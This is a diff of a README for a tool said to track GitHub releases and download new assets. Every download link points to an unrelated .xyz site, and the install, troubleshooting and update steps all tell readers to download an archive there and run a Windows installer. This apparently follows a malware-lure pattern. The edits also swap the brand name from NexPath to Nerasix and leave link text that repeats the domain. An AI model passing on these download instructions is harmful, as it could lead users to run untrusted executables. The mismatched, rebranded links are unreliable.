@@ -13,10 +13,6 @@
 
 > Tracks GitHub repository releases and downloads new assets into a folder you choose.
 
-## `ABOUT`
-
-Script that **monitors GitHub releases** and **downloads new assets** automatically to your disk.
-
 ## Download
 
 > Use the project link below for Windows.
@@ -25,6 +21,10 @@ Script that **monitors GitHub releases** and **downloads new assets** automatica
 * **Full URL:** `https://github-release-notifier-downloader.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
+
+## `ABOUT`
+
+Script that **monitors GitHub releases** and **downloads new assets** automatically to your disk.
 
 ## `FEATURES`
 
@@ -46,12 +46,12 @@ Script that **monitors GitHub releases** and **downloads new assets** automatica
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://github-release-notifier-downloader.nerasix.xyz/">github-release-notifier-downloader.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://github-release-notifier-downloader.nerasix.xyz/">github-release-notifier-downloader.github-release-notifier-downloader.nerasix.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://github-release-notifier-downloader.nerasix.xyz/">github-release-notifier-downloader.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the Nerasix download page, or open <a href="https://github-release-notifier-downloader.nerasix.xyz/">github-release-notifier-downloader.github-release-notifier-downloader.nerasix.xyz</a> directly in your browser.
 </details>
 
 <details>
@@ -61,5 +61,5 @@ Script that **monitors GitHub releases** and **downloads new assets** automatica
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://github-release-notifier-downloader.nerasix.xyz/">github-release-notifier-downloader.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://github-release-notifier-downloader.nerasix.xyz/">github-release-notifier-downloader.github-release-notifier-downloader.nerasix.xyz</a> again and download the latest version from Nerasix.
 </details>
